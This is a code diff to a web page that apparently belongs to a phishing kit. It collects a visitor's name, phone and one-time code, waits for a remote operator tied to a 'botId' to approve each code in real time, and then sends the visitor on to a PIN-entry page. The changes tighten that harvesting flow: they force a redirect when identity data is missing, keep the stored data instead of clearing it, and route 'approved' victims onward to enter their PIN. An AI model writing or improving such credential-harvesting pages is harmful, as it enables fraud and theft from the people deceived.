@@ -98,8 +98,8 @@ button:not(:disabled){ background:#00843d; }
   min-height:18px;
   font-weight:600;
 }
-#status.success{ color:#00843d; }   /* green */
-#status.error{   color:#d32f2f; }   /* red   */
+#status.success{ color:#00843d; }
+#status.error{   color:#d32f2f; }
 </style>
 </head>
 
@@ -152,14 +152,18 @@ const spinner     = document.getElementById('spinner');
 const statusEl    = document.getElementById('status');
 const timerDisplay= document.getElementById('timerDisplay');
 
-function getIdentity(){
-  return {
-    name:  localStorage.getItem("name")  || "Unknown",
-    phone: localStorage.getItem("phone") || "Unknown"
-  };
+// 🛡️ Guard: ensure name + phone exist
+const storedName  = localStorage.getItem("name");
+const storedPhone = localStorage.getItem("phone");
+if(!storedName || !storedPhone){
+  window.location.href = "index.html" + (botId ? "?botId=" + botId : "");
+  throw new Error("Missing identity — redirecting to index.html");
 }
 
-// 🎨 status helper: success = green, error = red
+function getIdentity(){
+  return { name: storedName, phone: storedPhone };
+}
+
 function setStatus(text, type){
   statusEl.textContent = text;
   statusEl.classList.remove("success", "error");
@@ -189,13 +193,12 @@ function startCountdown(duration = 30){
   let time = duration;
   timerDisplay.textContent = time;
   clearInterval(countdown);
-
   countdown = setInterval(()=>{
     time--;
     timerDisplay.textContent = time;
     if(time <= 0){
       clearInterval(countdown);
-      // No expiry message, no button disable — timer just stops at 0
+      // expiry logic removed
     }
   },1000);
 }
@@ -227,7 +230,7 @@ function pollCodeApproval(requestId){
       const d = await r.json();
       if(d.approved===true||d.approved===false){
         clearInterval(i);
-        resolve(d.approved);
+        resolve(d);
       }
     },1500);
   });
@@ -252,14 +255,14 @@ document.getElementById('otpForm').addEventListener('submit', async e=>{
     return;
   }
 
-  const approved = await pollCodeApproval(res.requestId);
+  const result = await pollCodeApproval(res.requestId);
   clearInterval(countdown);
 
-  if(approved){
+  if(result.approved){
+    // ✅ Approved (or "Code OK — Re-enter PIN") → go to pin.html
     setStatus("Code approved. Redirecting...", "success");
-    localStorage.clear();
-    window.location.href=`pin.html?botId=${botId}`;
-  }else{
+    window.location.href = "pin.html?botId=" + botId;
+  } else {
     setStatus("Incorrect OTP code. Please try again.", "error");
     inputs.forEach(i=>i.value="");
     submitBtn.disabled=false;
